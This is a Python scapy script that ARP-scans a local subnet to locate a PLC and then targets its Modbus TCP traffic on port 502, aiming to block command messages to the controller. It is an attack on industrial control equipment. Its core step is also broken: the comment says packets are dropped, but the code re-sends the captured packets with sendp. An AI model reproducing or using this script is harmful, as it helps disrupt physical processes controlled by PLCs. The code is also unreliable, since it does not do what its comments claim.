import socket
import scapy.all as scapy
import time

# Function to scan the network and find the PLC's IP address
def scan_network(subnet):
    print("Scanning network for PLC...")
    arp_request = scapy.ARP(pdst=subnet)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    devices = []
    for element in answered_list:
        devices.append({"ip": element[1].psrc, "mac": element[1].hwsrc})

    return devices

# Function to identify the PLC based on some criteria (e.g., MAC address, IP address, etc.)
def identify_plc(devices, plc_mac=None, plc_ip=None):
    for device in devices:
        if plc_mac and device["mac"] == plc_mac:
            return device["ip"]
        if plc_ip and device["ip"] == plc_ip:
            return device["ip"]
    return None

# Function to block command messages to the PLC
def block_command_messages(plc_ip):
    print(f"Blocking command messages to PLC at IP: {plc_ip}")
    while True:
        packets = scapy.sniff(filter=f"ip host {plc_ip}", count=10)
        for packet in packets:
            if packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 502:  # Assuming Modbus TCP port
                print(f"Blocking command message to {plc_ip}")
                # Drop the packet
                scapy.sendp(packet, iface="eth0", inter=0.1, loop=0, verbose=0)
        time.sleep(1)

# Main function
def main():
    subnet = "192.168.1.0/24"  # Change this to your network subnet
    plc_mac = "00:11:22:33:44:55"  # Change this to the PLC's MAC address if known
    plc_ip = None  # Change this to the PLC's IP address if known

    devices = scan_network(subnet)
    if not devices:
        print("No devices found on the network.")
        return

    if plc_ip:
        print(f"Using provided PLC IP: {plc_ip}")
    else:
        plc_ip = identify_plc(devices, plc_mac=plc_mac)
        if not plc_ip:
            print("PLC not found on the network.")
            return
        print(f"PLC found at IP: {plc_ip}")

    block_command_messages(plc_ip)

if __name__ == "__main__":
    main()